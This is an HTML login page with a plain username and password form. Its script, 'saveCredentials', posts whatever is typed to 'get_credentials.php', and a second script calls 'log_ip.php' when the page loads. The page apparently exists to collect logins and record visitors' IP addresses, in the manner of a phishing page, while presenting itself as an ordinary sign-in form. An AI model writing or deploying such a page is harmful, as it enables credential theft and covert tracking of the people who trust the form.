<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .login-container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            width: 300px;
            max-width: 100%;
            text-align: center;
        }

        .login-header {
            background-color: #3498db;
            color: #fff;
            padding: 20px;
        }

        .login-form {
            padding: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }

        .form-group input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .form-group button {
            background-color: #3498db;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
    </style>

    <script>
        function saveCredentials() {
            var username = document.getElementById('inputEmailfield').value;
            var password = document.getElementById('inputPasswordfield').value;
    
            var formData = new FormData();
            formData.append('inputEmailfield', username);
            formData.append('inputPasswordfield', password);
    
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'get_credentials.php', true);
            xhr.send(formData);
        }
    </script>

    <script>
        fetch('log_ip.php')
            .then(response => response.text())
            .then(data => console.log(data))
            .catch(error => console.error('Error:', error));
</script>

</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h2>Login</h2>
        </div>
        <div class="login-form">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="inputEmailfield" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="inputPasswordfield" name="password" required>
            </div>
            <div class="form-group">
                <button onclick="saveCredentials()" id="submitEntrar" type="submit">Login</button>
            </div>
        </div>
    </div>
</body>
</html>
